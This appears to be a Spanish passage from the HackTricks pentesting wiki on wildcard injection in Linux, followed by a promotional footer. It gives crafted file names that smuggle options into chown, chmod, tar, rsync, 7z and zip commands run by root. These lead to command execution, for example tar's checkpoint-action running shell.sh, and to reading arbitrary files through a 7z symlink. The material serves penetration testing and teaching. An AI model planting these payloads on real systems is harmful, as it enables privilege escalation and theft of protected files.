## chown, chmod

Puedes **indicar qué propietario de archivo y permisos quieres copiar para el resto de los archivos**.
```bash
touch "--reference=/my/own/path/filename"
```
Puedes explotar esto usando [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(ataque combinado)_\
__Más información en [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Ejecutar comandos arbitrarios:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Puedes explotar esto usando [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(ataque tar)_\
__Más información en [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Ejecutar comandos arbitrarios:**
```bash
Interesting rsync option from manual:

 -e, --rsh=COMMAND           specify the remote shell to use
     --rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Puedes explotar esto usando [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(ataque rsync)_\
__Más información en [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

En **7z**, incluso usando `--` antes de `*` (nota que `--` significa que la entrada siguiente no puede ser tratada como parámetros, solo como rutas de archivo en este caso), puedes causar un error arbitrario para leer un archivo, así que si un comando como el siguiente está siendo ejecutado por root:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
Y puedes crear archivos en la carpeta donde se está ejecutando esto, podrías crear el archivo `@root.txt` y el archivo `root.txt` siendo un **enlace simbólico** al archivo que deseas leer:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Entonces, cuando se ejecuta **7z**, tratará `root.txt` como un archivo que contiene la lista de archivos que debe comprimir (eso es lo que indica la existencia de `@root.txt`) y cuando 7z lea `root.txt`, leerá `/file/you/want/to/read` y **como el contenido de este archivo no es una lista de archivos, arrojará un error** mostrando el contenido.

_Más información en los Write-ups de la máquina CTF de HackTheBox._

## Zip

**Ejecutar comandos arbitrarios:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtén la [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sígueme en** **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
